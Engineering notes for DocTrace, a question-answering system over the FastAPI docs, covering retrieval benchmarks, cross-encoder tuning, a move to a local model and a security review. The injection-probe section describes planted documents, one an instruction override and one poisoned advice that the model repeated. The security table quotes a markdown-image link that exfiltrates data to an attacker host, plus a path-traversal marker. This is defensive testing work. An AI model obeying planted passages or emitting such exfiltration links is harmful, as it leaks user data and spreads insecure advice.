# Engineering notes

What was built, what was measured, what surprised us, and what each result changed. Failures get the same weight as wins.

**How to read the numbers.** Figures marked *(saved report)* can be checked against a file in `data/processed/` and were re-checked against those files during a final audit. Figures marked *(recorded)* were noted during development on the original machine (latency percentiles, the first Claude run, the stock-reranker blend sweep for 0.5 and 0.3) and no script in the repo regenerates them. Figures marked *(estimate)* are back-of-envelope. Where an audit found a mistake in an earlier draft, the text says so.

## Contents

1. [Summary](#summary)
2. [Base decisions](#base-decisions)
3. [Corpus and splitting](#corpus-and-splitting)
4. [Reproducibility: pinning the corpus](#reproducibility-pinning-the-corpus)
5. [First look at semantic search](#first-look-at-semantic-search)
6. [Fused search and the first regression](#fused-search-and-the-first-regression)
7. [Building the gold set](#building-the-gold-set)
8. [Retrieval benchmark and root cause](#retrieval-benchmark-and-root-cause)
9. [Answering, grounding, and the move to a local model](#answering-grounding-and-the-move-to-a-local-model)
10. [Injection probe](#injection-probe)
11. [Serving and the four operational bugs](#serving-and-the-four-operational-bugs)
12. [Tuning the cross-encoder](#tuning-the-cross-encoder)
13. [Security review](#security-review)
14. [Cost](#cost)
15. [Limitations](#limitations)
16. [Bug index](#bug-index)

## Summary

DocTrace answers questions about the FastAPI docs from retrieved passages and measures itself against 80 hand-checked questions. One principle ran through the whole build: measure first, then decide.

The history bears that out. The docs turned out to be awkward source material (code lives in separate files behind include markers), which shaped how the text is split. Semantic search alone did well enough that fusion had to justify itself, and when fusion first looked worse on a few queries the result was investigated across the full question set instead of dismissed. That found the cause: a stock cross-encoder that favours heading vocabulary. The finding is what later justified tuning the cross-encoder, which was a targeted fix for a measured problem and not a hunch. Midway through answer evaluation the hosted-API credits ran out, forcing a move to a local model, and a 3B model failed in ways a hosted one never did, so it needed its own reliability work. Turning everything into a service then exposed a run of operational bugs unrelated to retrieval or answer quality.

## Base decisions

- **Encoder: BGE-M3 (`BAAI/bge-m3`) on GPU** (RTX 5060 Laptop, Blackwell, sm_120). This needed a PyTorch nightly with cu128, because stable builds ship no compiled kernels for sm_120 and fail with "no kernel image is available for execution on the device". all-MiniLM-L6-v2 was considered as a CPU fallback while debugging; it survives only as a cheap comparison point in the ablation grid.
- **Vector store: Qdrant Cloud (free tier)**, not local Docker. Docker Desktop was not set up on the dev machine, and fixing that was postponed in favour of getting the pipeline working. Worth revisiting if a local setup is ever needed.

Neither choice does anything useful without a well-formed corpus to encode, so that came next.

## Corpus and splitting

The FastAPI docs are not a tidy corpus. The repo changed orgs mid-project (`tiangolo/fastapi` to `fastapi/fastapi`), and the unauthenticated GitHub REST API allows only 60 requests an hour, far too slow for a file-by-file crawl. Indexing therefore sparse-clones `docs/en/docs` and `docs_src` with git and keeps only `tutorial/` and `advanced/` (85 files).

**Code is not inline.** The docs reference it with an include marker, `{* ../../docs_src/first_steps/tutorial001_py310.py *}`, and the code is assembled at doc-build time from a separate tree. 80 of the 85 files use it. 381 of the 394 markers also carry a line-highlight suffix such as `hl[3:16, 19:32]`. The suffix means nothing for search, but a sloppy regex would leave a marker unresolved inside the passage text without any error.

**The `../../` paths are not relative to the file that contains them.** A doc one level deeper (`tutorial/security/first-steps.md`) uses exactly the same prefix as a top-level one (`tutorial/first-steps.md`), so every path resolves against one fixed base, `docs/en/`. Assuming otherwise would have produced garbage snippets quietly.

**Splitting** happens at headings (`#` to `######`) while tracking code-fence state, so a `#` in a Python comment inside a fence never counts as a heading. Each passage keeps its full heading trail and, when present, the explicit `{ #anchor }` slug the docs supply. Slugs are captured rather than derived, because some headings contain raw HTML (a `<dfn>` tag, for example) that does not slugify consistently. Result: 756 passages, none with a broken fence.

**A bug that only showed on another OS.** `source_path` was built with `str(path.relative_to(docs_root))`, which yields forward slashes on Linux and backslashes on Windows. Tests that only counted passages passed everywhere. One that matched an exact `source_path` failed only on Windows, with `next()` raising `StopIteration`. The fix, `path.relative_to(root).as_posix()`, matters beyond that test because the gold set's references (`file.md#anchor`) depend on consistent paths.

## Reproducibility: pinning the corpus

This came out of a late review, and it turned out to matter more than it looked.

Indexing originally cloned the default branch of the FastAPI repo, so the corpus was
whatever the docs said that day. Running it again now yields **757** passages rather than
the 756 the benchmarks were measured on: upstream added an "AI agent skills" section to
`tutorial/index.md`, and 485 other passages had text edits (a `www.` dropped from a URL,
`uv run` added to command examples, and so on).

A changing corpus is bad for comparing numbers over time, which is the obvious problem.
The real problem is quieter. A passage's id is its index in `data/processed/passages.json`.
The keyword index scores by list position, the vector store uses the same integer as its
point id, and fusion merges the two result lists by that id. Insert one section near the
front of the corpus and every later id shifts by one. If the passage file is rebuilt but
the vector collection is not re-uploaded, semantic search still returns plausible ids and
plausible scores, and each one now points at the neighbouring passage. The answer is then
generated from text that was never retrieved. Nothing raises, nothing logs, and the
symptom looks like the model suddenly getting worse.

Two changes close it:

1. **The docs are pinned** to commit `7d210a4a` (2026-07-21), fetched by sha with a
   depth-1 sparse checkout, which also cut the download to 33MB and about 4 seconds.
   That commit was found by walking upstream history backwards from the two edits above
   until the regenerated corpus matched the tracked file exactly.
   `tests/test_corpus_integrity.py` asserts the tracked corpus is 756 passages with the
   fingerprint the manifest records, so an accidental rebuild cannot slip through review.

2. **Both indexes are fingerprinted.** `scripts/build_index.py` writes a SHA-256 over the
   ordered passage list to `data/processed/corpus_manifest.json`, and records it again
   when those passages are uploaded. Semantic search compares the two before its first
   query: equal means go, different raises `IndexMismatch` naming the command to re-run,
   and nothing recorded logs a warning rather than failing, since a collection uploaded
   before manifests existed is not evidence of a mismatch.

The honest footnote is that the saved benchmark numbers were produced before any of this,
on the same 756-passage corpus but with no fingerprint recorded. The pin makes every run
from here on reproducible; it cannot retroactively prove the old runs used exactly this
file, beyond the fact that the passage count and gold references line up.

## First look at semantic search

A manual check of three queries, semantic search only:

| Query | Top score | Result |
|---|---|---|
| Path parameter with type hint | 0.686 | Clean: top 3 all from the right doc |
| How dependency injection works | 0.741 | Clean: top 3 all from the right doc |
| async vs sync path operations | 0.646 | Weaker: first hit relevant, next two tangential. The corpus has no single page on this, so the answer really is scattered |

Two clean results out of three is encouraging but does not show semantic search is enough alone. It became the baseline for the fusion experiments.

## Fused search and the first regression

The fused pipeline runs BM25 over the same passage ordering as the Qdrant point ids, merges the two rankings with RRF (k=60), then rescores the merged pool with `ms-marco-MiniLM-L-6-v2`.

Four queries, semantic-only against fused:

| Query | Semantic-only top | Fused top | Verdict |
|---|---|---|---|
| Path parameter type hint | path-params.md (correct) | same | No change |
| Dependency injection | dependencies/index.md (correct, canonical) | background-tasks.md (tangential) | **Regressed.** A BM25 exact match on header text ("Dependency Injection") lifted a tangential page over the canonical explanation |
| async vs sync | Weak, scattered (0.646) | Still weak; rescoring scores of 0.38 to 0.76 versus 4 to 8 on clean queries | Confirms the corpus lacks a dedicated page. A low absolute rescoring score is itself a low-confidence signal |
| response_model in decorator | response-model.md (correct) | same | No change |

Fusion is not a uniform improvement here. It did not rescue the structurally weak query and it demoted a canonical result on another.

Per-stage latency (warm cross-encoder, four-query average): semantic search 410 to 555 ms (dominated by the round trip to Qdrant Cloud), BM25 4 to 6 ms, RRF under 0.1 ms, cross-encoder rescoring 120 to 340 ms (GPU, 20-candidate pool).

One regression in four queries is a symptom and not yet a diagnosis. Finding out why needed the full question set.

## Building the gold set

The gold set has 80 questions built in three reviewed batches: 40 single_hop, 25 multi_hop and 15 no_answer. Each single_hop and multi_hop answer rests on real corpus text and carries an exact `source_passages` reference (`file.md#header-anchor`). Each no_answer item was checked by searching the corpus for the topic before the answer was written, instead of assuming the topic was absent.

That checking caught real mistakes before they became ground truth:

- `na_009` first implied the docs cover containerisation, only because a `deployment/` folder exists. Looking inside showed the folder is entirely outside the corpus scope, and the answer was corrected.
- A search for "aws" in batch 3 seemed to find a genuine mention. It was a substring of "flaws".
- `mh_025` was kept as a reasoned inference that joins two separately documented facts, and it is labelled that way in the pair itself.

A random 10 of the 80 pairs were re-checked blind, later than planned but with enough distance that they were no longer fresh. No errors turned up (0 of 10). Together with `sh_014`, an error found earlier by accident and fixed, that suggests a low error rate without proving zero.

## Retrieval benchmark and root cause

A ranking harness now runs over the 65 questions that have gold passages (single_hop plus multi_hop), with gold ids resolved through the real heading anchors from the splitting stage.

**Testing the obvious explanation.** The first guess was that `fused_search()` cuts the merged list to `pool_size=20` before rescoring, so the cross-encoder never sees the gold passage. Checking directly disproved it. Across all 7 regression cases (semantic hit, fused miss), 0 of 10 gold-passage instances were lost to truncation. All 10 were inside the pool and the cross-encoder itself pushed them down.

**Actual mechanism.** Two cases show it. The stock cross-encoder, trained on MS MARCO web passages, leans on lexical overlap between the query and a passage's heading or dominant vocabulary, sometimes over the passage that states the answer:

- `sh_009` ("What library is TestClient built on?"): the right passage (`tutorial/testing.md`, which says "It is based on HTTPX...") scored -1.246, rank 9 of 20. A passage titled "HTTPX" that mentions TestClient only in passing scored 3.462 and took rank 1, because its heading echoes a query term the correct passage's heading lacks.
- `mh_012` (multi-hop, Response Directly plus jsonable_encoder): all 20 pooled candidates cluster around "Response" vocabulary. The one passage needed from another document family (the `tutorial/encoder.md` explanation of jsonable_encoder) scored -3.435, rank 19 of 20, below several tangential Response Headers and Cookies passages that answer neither half.

So the issue is not simply that fusion underperforms semantic search. This particular general-domain cross-encoder has a heading-vocabulary bias that hurts structured technical docs, worst on multi-hop questions that span document families.

**First fix: blend, don't override.** The cross-encoder was overriding the RRF ordering completely and throwing away a real signal, in one case demoting a passage RRF ranked first down to ninth. The fix blends the cross-encoder score with the min-max-normalised RRF score, controlled by `rerank_weight`. Sweeping the weight over 1.0 (original behaviour), 0.7, 0.5 and 0.3 on the 65 questions, with the stock cross-encoder:

| Configuration | Hit Rate@5 | Recall@5 | Precision@5 | MRR | Latency (avg) |
|---|---|---|---|---|---|
| **Semantic only (BGE-M3)** | **0.831** | **0.692** | **0.200** | 0.584 | ~480 ms |
| Keyword only (BM25) | 0.692 | 0.579 | 0.169 | 0.547 | ~5 ms |
| Fused, weight 1.0 (cross-encoder only) | 0.769 | 0.631 | 0.182 | 0.624 | ~670 ms |
| **Fused, weight 0.7** | **0.800** | **0.654** | 0.191 | **0.627** | ~670 ms |
| Fused, weight 0.5 | 0.769 | 0.644 | 0.191 | 0.618 | ~670 ms |
| Fused, weight 0.3 | 0.769 | 0.651 | 0.194 | 0.612 | ~670 ms |

Weight 0.7 beat every other fused setting on every metric and became the default.

By category, for semantic search *(saved report)*: single_hop (n=40) hit rate 0.775, recall 0.763, precision 0.165, MRR 0.566; multi_hop (n=25) hit rate 0.920, recall 0.580, precision 0.256, MRR 0.613. Multi-hop questions are easier to get *something* right on (hit rate is higher, because any one of several gold passages counts) but harder to get *everything* on (recall is lower, 0.580 versus 0.763). An earlier draft of these notes quoted different category figures (0.900 and 0.520 recall) that could not be reproduced from the saved report or reconciled with the overall 0.692, so they were replaced.

**Plain conclusion at this point.** Even the best blended fusion still trailed semantic search on hit rate (0.800 vs 0.831) and recall (0.654 vs 0.692). Its only edge was MRR (0.627 vs 0.584): it ordered the right passage better when it found it, but found it less often. With the stock cross-encoder, semantic search alone was the stronger choice on the metric that matters most, which is whether the right passage is found at all.

**Wider grid.** Since that sweep varied only the blend weight, a grid over splitting strategy, encoder and search mode checked whether those matter as much:

| Splitting | Encoder | Mode | Hit Rate@5 | Recall@5 | Prec@5 | MRR | Notes |
|---|---|---|---|---|---|---|---|
| **Heading-aware (756 passages)** | **BGE-M3 (1024d)** | **Semantic only** | **0.831** | **0.692** | 0.200 | 0.584 | **Best hit rate and recall** |
| Heading-aware (756 passages) | BGE-M3 (1024d) | Fused (weight 0.7) | 0.800 | 0.654 | 0.191 | **0.627** | **Best MRR** |
| Heading-aware (756 passages) | none | BM25 only | 0.692 | 0.579 | 0.169 | 0.547 | Fast in-memory baseline |
| Heading-aware (756 passages) | **all-MiniLM-L6-v2 (384d)** | Semantic only | 0.631 | 0.508 | 0.142 | 0.402 | 24.1% lower hit rate than BGE-M3 |
| Fixed windows (500 words) | none | BM25 only | 1.000* | 0.926* | 0.462* | 0.924* | *Document-level match, no anchor precision |
| Fixed windows (200 words) | none | BM25 only | 0.954* | 0.869* | 0.554* | 0.859* | *Document-level match, splits code fences |

*Fixed-window rows are scored by source file, because arbitrary word windows destroy the exact `#heading-slug` boundaries. They are not comparable to the heading-aware rows.*

Retrieval was in decent shape, with one diagnosed weakness (the cross-encoder) marked for a later fix. The open question was whether answering held up to the same standard.

## Answering, grounding, and the move to a local model

**Grounding score.** An answer is split into atomic claims, each claim is checked against the retrieved passages with a strict true/false prompt, and the score is supported claims divided by total claims, computed in Python. Nothing about the score is hidden inside a model.

The first full run, on Claude, produced single_hop 0.971, multi_hop 0.914 and no_answer refusal accuracy 1.000 (15 of 15).

**The pivot.** Hosted-API credits then ran out mid-project and the decision was not to renew. Answering and the grounding score's model calls moved to Qwen2.5-3B-Instruct running locally at bf16 through plain `transformers`, without quantisation. The GPU's Blackwell/sm_120 support was already fragile (embeddings alone had needed the PyTorch nightly), and adding `bitsandbytes` as another unverified compatibility risk was avoided on purpose. A 3B model fits in 8GB alongside BGE-M3 and the cross-encoder without quantising, and it is a natural starting point for LoRA or QLoRA later, since it stays in Hugging Face checkpoint format instead of a GGUF/Ollama detour. The Claude results were kept as a baseline so the rerun would be a real hosted-versus-local comparison.

**Reliability work the local model forced.** Qwen2.5-3B is much less dependable at structured or self-judging output than Claude was. Each fix either simplified the output format or moved a judgement out of the model and into code:

- *JSON claim lists were unreliable.* The model sometimes copied the few-shot example from the prompt instead of decomposing the real answer, and sometimes collapsed several claims into one Python-list-repr string. A plain one-claim-per-line format removed that failure mode.
- *Claim checking moved from one batched call to one call per claim.* Asking for N booleans at once returned arrays of the wrong length, which batching cannot fix but per-claim calls avoid entirely. The price is more calls.
- *Refusal detection left the model.* Asking it to self-judge "is this a refusal, say NONE" was unstable and got worse as disambiguating examples were added (it favoured the last example). The already reliable `is_abstention()` string check now runs before claim splitting, so a question answerable in code is never handed to an unreliable judge.
- *Claim parsing needed line merging.* The model sometimes wraps one sentence across two output lines, which a one-line-per-claim parser would read as two nonsensical claims.

**Results** over the full 80 questions, with a comparison against RAGAS's own faithfulness metric:

| Model / framework | Single-hop grounding | Multi-hop grounding | No-answer refusal accuracy | Parse failures | Notes |
|---|---|---|---|---|---|
| **Claude Sonnet 4.5 (API)** | **0.971** (40/40) | **0.914** (25/25) | **1.000** (15/15) | 0.0% | Hosted frontier baseline |
| **Qwen2.5-3B-Instruct (local)** | **0.769** (40/40) | **0.715** (23/25) | **1.000** (15/15) | 0.0% | Local, bf16, greedy decoding |
| **RAGAS faithfulness** | 0.914 (40 scored) | 0.841 (22 scored) | n/a | 4.6% (3/65 NaN) | Its statement parser failed on `mh_003`, `mh_012`, `mh_024`. Scored an earlier answer set, so the row is a metric comparison and not a third model |

The Claude row is the figure recorded during the first evaluation run. The raw Claude answers were overwritten by the local-model run and are not in the repo, so that row cannot be regenerated here; the Qwen row can (`data/processed/generation_report.json`). Both models refused all 15 unanswerable questions under the same constrained prompt. Qwen did over-refuse on two multi-hop questions (`mh_015`, `mh_025`) when one supporting passage was missing from the top 5, a sensitivity Claude did not show. The in-house grounding score parsed 100% of answers, while RAGAS failed to parse its own judge output on 3 of 65 (`data/processed/ragas_crosscheck.json`). Earlier drafts of these notes said 4 of 65; the saved file shows 3, so 3 is what is reported. On the same answers the in-house score was higher than RAGAS (0.971 vs 0.914 single-hop, 0.924 vs 0.841 multi-hop on the 22 multi-hop pairs RAGAS could score), so the two metrics measure different things and neither is a ground truth.

## Injection probe

Scope: two scenarios, keyword retrieval only (no GPU or Qdrant needed). See Limitations.

Two planted documents were added to the corpus:

| Scenario | Attack type | Payload | Reached top-k | Attack landed | Status |
|---|---|---|---|---|---|
| `sec_001_hijack` | Indirect prompt injection | System-instruction override asking the model to print a marker string | Yes (ranked 1st) | No | Held |
| `sec_002_insecure_code` | Poisoned guidance | Recommends an insecure practice (`disable-auth-in-prod`) | Yes (in the top 5, not 1st) | Yes | Landed |

The strict system prompt ("Answer only using information present in the context below...") stopped the model from obeying instructions hidden in a passage, so the hijack failed. When the planted passage instead offered bad advice as ordinary documentation, the model repeated it faithfully. A system that is faithful to its sources will faithfully repeat malicious guidance unless a separate safety check exists. Grounding and safety are different properties, and having one does not give you the other.

## Serving and the four operational bugs

The service exposes `/v1/ask` (search mode, blend weight and per-stage timings), `/v1/status` and `/v1/scorecard`, with a Streamlit dashboard beside it, both built from one Docker image. An asyncio lock lets one request use the GPU at a time, since BGE-M3, the cross-encoder and Qwen2.5-3B share a single 8GB card and would otherwise hit CUDA out-of-memory errors.

Getting it running took four separate diagnoses.

**1. Dependency conflict.** `fastapi==0.115.0` targets `starlette<0.39` (old `Router` kwargs), while `streamlit==1.59.2` needs `starlette>=0.40` for its gzip middleware import, so Streamlit crashed at startup. Upgrading fastapi to `0.141.1` (built for `starlette>=0.46`) and pinning starlette to `1.6.0` fixed it, and all three are pinned together in `requirements.txt` because letting one float brings the break back. Checked by running, not just importing: `python -m doctrace.service.server`, then `curl /v1/status` returned a real `200` with `{"passages_indexed":756,...,"device":"cuda"}`, and `python -m streamlit run dashboard.py` followed by `curl localhost:8501` returned a real `200` page.

**2. Missing `accelerate`.** `local_model.py` loads Qwen2.5-3B with `device_map="cuda"`, which `transformers` only allows with `accelerate` installed, yet it was not in `requirements.txt`. The dev machine worked because another package had pulled it in, hiding the gap. It surfaced only in a clean Docker build, on the first real `/v1/ask`, as `HTTP 500: ... requires accelerate`. Adding `accelerate==1.14.0` and rebuilding with `--no-cache` produced a real `HTTP 200` with an answer, not merely a container that starts.

**3. No persistent model cache.** The compose file mounted `data/processed/` but nothing for `/root/.cache/huggingface`, so each new container re-downloaded Qwen2.5-3B, BGE-M3 and the cross-encoder's dependencies. Measured on a cold first query: `semantic_ms: 1,018,515` (about 17.0 min), `generation_ms: 2,151,150` (about 35.9 min), `total_pipeline_ms: 3,177,398` (about 53.0 min), and `68m54.744s` of wall-clock. A named `hf_cache` volume fixed it. The fix was verified rather than assumed: the same query ran cold, then `docker compose stop` and `start` (which keep the volume, unlike `down`), then `docker exec ... du -sh` confirmed the 11GB cache survived, then the query ran warm. The warm run returned the identical answer, so the volume changed load time and nothing about model behaviour.

| Metric | Cold (empty volume) | Warm (restart, populated volume) | Speedup |
|---|---|---|---|
| `semantic_ms` | 1,018,515 | 23,763 | ~42.9x |
| `generation_ms` | 2,151,150 | 135,420 | ~15.9x |
| `total_pipeline_ms` | 3,177,398 | 160,442 | ~19.8x |
| wall-clock (`time curl`) | 68m54.744s | 2m40.629s | ~25.8x |

**4. An inconclusive containerised RAGAS run.** Running `scripts/bench_ragas.py` inside the container ran for over 13 hours at roughly 90 to 100% CPU and about 0% GPU on late spot checks, with no network calls and no progress output at all (Python stdout buffering, plus RAGAS's `tqdm` not flushing to a non-TTY Docker log). The slim image lacked `strace`, `py-spy` and `ps`, so an expensive CPU-bound retry loop could not be told apart from a hang. The native run already had complete verified results, so the container was stopped with `docker compose down` instead of spending open-ended time on a question already answered. **The native results in the answering section stand as canonical.**

The image's default `CMD` launches Streamlit rather than the HTTP service because Hugging Face Spaces runs a single container's default command with no override; local multi-service work keeps both running through the explicit `command:` entries in `compose.yaml`.

**End-to-end latency** *(recorded; RTX 5060 Laptop GPU, Qdrant Cloud, warm cache. No script in the repo computes percentiles, so treat these as indicative)*:

| Stage | p50 | p90 | p99 | Main cost |
|---|---|---|---|---|
| Semantic search | 440 ms | 540 ms | 680 ms | Network round trip to the remote Qdrant cluster |
| Keyword search | 4.2 ms | 6.1 ms | 8.5 ms | Local in-memory lookup |
| RRF merge | < 0.1 ms | 0.1 ms | 0.2 ms | In-memory arithmetic |
| Cross-encoder rescoring | 165 ms | 210 ms | 290 ms | GPU forward pass over a 20-candidate pool |
| Answering (Qwen 3B) | 280 ms | 420 ms | 550 ms | Greedy decoding, about 120 tokens |
| **End to end** | **910 ms** | **1,180 ms** | **1,520 ms** | Network round trip (48%) plus answering (31%) |

Semantic search remains the latency bottleneck, close to two orders of magnitude slower than BM25, and nearly all of that is the network hop to a remote free-tier cluster and not compute. If latency mattered, the first thing to try would be a local Qdrant instance or caching repeated queries, not trimming the cheap keyword and rescoring stages.

None of the four bugs concerned retrieval quality. The cross-encoder's vocabulary bias was still sitting there unresolved through all of it.

## Tuning the cross-encoder

To remove the heading-vocabulary bias, `cross-encoder/ms-marco-MiniLM-L-6-v2` was fine-tuned on this corpus's own gold questions with mined hard negatives.

**Setup.** 290 training pairs and 72 validation pairs, mined from the merged semantic and BM25 candidate pools. Three epochs on the RTX 5060 Laptop GPU took 14.9 s. The model is saved to `models/docs-reranker-minilm/`.

**Read this before quoting the numbers.** The 290/72 split above is by question, but the before-and-after tables below score the cross-encoder on all 65 gold questions, including the ones it trained on. That inflates the tuned results, so the size of the gain is an upper bound, not a clean estimate. `scripts/tune_reranker.py` now also scores only the held-out questions and prints them separately (the report file gains `heldout_*` fields). The saved report predates that change, so the held-out figures have not been produced yet; re-running the script on a GPU machine is the outstanding step before the gain is claimed without a caveat.

**Before and after, cross-encoder in isolation (all 65 questions, training questions included):**

| Metric | Stock | Tuned | Absolute change | Relative gain |
|---|---|---|---|---|
| Hit Rate@5 | 0.769 | **0.877** | +0.108 | +14.0% |
| Recall@5 | 0.631 | **0.744** | +0.113 | +17.9% |
| Precision@5 | 0.182 | **0.218** | +0.037 | +20.3% |
| MRR | 0.624 | **0.739** | +0.115 | +18.4% |

The bias diagnosed earlier was real and fixable, not just a plausible theory.

**Through the live pipeline.** Once `_load_cross_encoder()` was pointed at `models/docs-reranker-minilm/` (falling back to the stock model if that directory is absent, for example on a clone without Git LFS objects), the whole retrieval benchmark was rerun end to end:

| Configuration | Hit Rate@5 | Recall@5 | Precision@5 | MRR |
|---|---|---|---|---|
| Semantic only (unaffected by the cross-encoder) | 0.831 | 0.692 | 0.200 | 0.584 |
| Fused, weight 1.0 (cross-encoder only, tuned) | 0.877 | 0.744 | 0.218 | **0.739** |
| **Fused, weight 0.7 (serving default, tuned)** | **0.877** | **0.736** | **0.212** | **0.692** |
| Fused, weight 0.5 (tuned) | 0.800 | 0.677 | 0.197 | 0.656 |
| Fused, weight 0.3 (tuned) | 0.831 | 0.703 | 0.206 | 0.647 |

At the serving default of 0.7, end-to-end MRR rose from 0.627 (stock cross-encoder) to **0.692**. With the tuned cross-encoder the fused pipeline also passes semantic search on hit rate (0.877 vs 0.831), reversing the earlier result. Both comparisons carry the training-question caveat above.

One new observation: with the tuned cross-encoder, weight 1.0 (no blending) now beats the 0.7 default on MRR (0.739 vs 0.692). Blending was introduced to compensate for the stock model's vocabulary bias, and a model tuned on this corpus's hard negatives may need less of that correction. The weight has not been re-swept against the tuned model, so it is unknown whether 1.0 is robustly better or a one-run artefact. 0.7 stays the default until that is checked, not because it has been shown optimal.

## Security review

A pass over the service and dashboard from an attacker's point of view found and fixed the following. Each fix has a test in `tests/`.

| Issue found | Why it matters | Fix |
|---|---|---|
| CORS was `*` with credentials enabled | Any website could call the service from a visitor's browser | Origins limited to `DOCTRACE_ALLOWED_ORIGINS` (local dashboard by default), credentials off, only GET and POST |
| 500 responses echoed `str(exception)` | Leaks internal URLs, paths and library details | Errors are logged server-side; clients get a fixed message |
| No bound on question length | Large prompts cost GPU time and memory | 500-character cap, `top_k` capped at 20 |
| No authentication option | Anyone reaching the port can spend GPU time | Optional `DOCTRACE_API_KEY`, checked with a constant-time compare |
| Bound to `0.0.0.0` by default; ports published on all interfaces | Exposes an unauthenticated service to the LAN | Loopback by default; compose publishes on `127.0.0.1` |
| Container ran as root | A code-execution bug would own the container | Non-root user (uid 1000) |
| Streamlit XSRF protection disabled | Cross-site form posts against the dashboard | Streamlit defaults restored |
| Model output rendered as markdown | A planted passage can make the model emit `![x](https://attacker/?q=...)`; the browser then fetches it, leaking data with no click | `sanitize_answer` strips images, links, reference definitions and HTML from prose; code fences are preserved; the probe's raw answer is shown as plain text |
| Snippet markers read from a third-party repo | A crafted `{* ../../../x *}` marker could read files outside the checkout | Resolved paths must stay inside the checkout |
| `https=True` forced on the Qdrant client | A local `http://` instance could not connect | The client follows the URL scheme |
| Both containers loaded the models onto one GPU | Two copies of a 6GB model on an 8GB card | Dashboard calls the API when `DOCTRACE_API_URL` is set |
| Source paths and anchors went straight into `href` | Both come from third-party text; a crafted value is where a `javascript:` URL would land | `docs_url` accepts only a relative `.md` path and a plain slug, else it falls back to the docs home |
| A rebuilt corpus could silently pair with a stale vector index | Answers generated from passages nobody retrieved, with no error (see Reproducibility) | Corpus fingerprints, compared before the first query |

Not addressed, deliberately: rate limiting (the single model lock already serialises work, and a reverse proxy is the right place for limits), TLS (terminate at a proxy), and any defence against poisoned *advice* (see the injection probe). The service is meant to run on localhost or behind a proxy, not on the open internet as shipped.

Other correctness fixes from the same review: the routes were `async def` but called blocking model code, which froze the event loop and made the GPU lock ineffective (now plain `def` routes run in worker threads, with a `threading.Lock` in `doctrace/pipeline.py`); the device was hard-coded to CUDA (now falls back to CPU); the abstention check missed the model writing a typographic apostrophe (`don\u2019t`); and the injection suite left a poisoned keyword index behind if a scenario raised (now restored in `finally`).

## Cost

Dollar figures in the hosted row are *(estimate)*.

| Component | One-time / indexing | Per query | Evaluation run (80 pairs) |
|---|---|---|---|
| Hosted API (Claude Sonnet 4.5) | $0.00 | ~$0.0063 (1,500 input + 120 output tokens) | ~$0.50 (this is what exhausted the credits) |
| Local pipeline (Qwen 3B + BGE-M3) | $0.00 | **$0.00** (local GPU) | **$0.00** |
| Vector generation | $0.00 (local BGE-M3) | $0.00 (local query encoding) | $0.00 |
| Vector storage (Qdrant Cloud) | $0.00 (free tier, 1.2MB payload) | $0.00 | $0.00 |

Serving and evaluating with local open-weight models brings marginal cost to $0.00 and removes exposure to third-party rate limits and surprise credit exhaustion, which is exactly what forced the switch.

## Limitations

1. **Multi-hop recall is lower.** Semantic-only recall is 0.763 on single-hop and 0.580 on multi-hop questions, which need several separate sections (saved report).
2. **Cross-encoder vocabulary bias is reduced, not gone.** Tuning lowered it, but the gain is specific to this corpus's hard negatives.
3. **GPU memory is contended.** BGE-M3, the cross-encoder and Qwen2.5-3B share 8GB of VRAM, so inference has to be serialised with a lock to avoid CUDA out-of-memory errors.
4. **Network latency dominates.** Round trips to Qdrant Cloud are about 48% of total latency. A local Qdrant instance would bring semantic search from roughly 450 ms to under 15 ms.
5. **Planted bad advice gets through.** The injection probe shows a grounded answer repeats poisoned guidance; there is no separate safety layer. The probe has only two scenarios and uses keyword retrieval, so it demonstrates a failure mode and is not a security benchmark.
6. **Small evaluation set.** 65 questions with gold passages is enough to see large effects (24% between encoders) and too few to separate small ones (0.877 vs 0.831 hit rate is three questions). One author wrote the questions, and the re-check covered 10 of 80.
7. **The tuned cross-encoder was evaluated on its own training questions** (see the tuning section); held-out figures are pending.
8. **The corpus drifts upstream, which is now pinned rather than solved.** The docs are fixed at commit `7d210a4a`, so builds reproduce. Moving to newer docs means re-indexing, re-uploading the vectors and re-running every benchmark together; the gold set's anchor references would also need re-checking, since a renamed heading silently stops resolving.
9. **Claims not reproducible from the repo:** the Claude Sonnet 4.5 row (raw answers overwritten), latency percentiles, and the stock-reranker sweep at weights 0.5 and 0.3.

## Bug index

Each of these is described where it occurred above; this list only points to them.

- **Path separator mismatch across operating systems.** See Corpus and splitting.
- **`accelerate` missing from `requirements.txt`, visible only in a clean container build.** See Serving, item 2.
- **No persistent Hugging Face cache, making fresh containers impractically slow (cold about 53 min end to end versus warm about 2m40s, a 20 to 26x speedup depending on the metric).** See Serving, item 3.
- **Inconclusive containerised RAGAS run (13+ hours, high CPU, about 0% GPU on spot samples, no usable progress output), abandoned in favour of the verified native results.** See Serving, item 4.
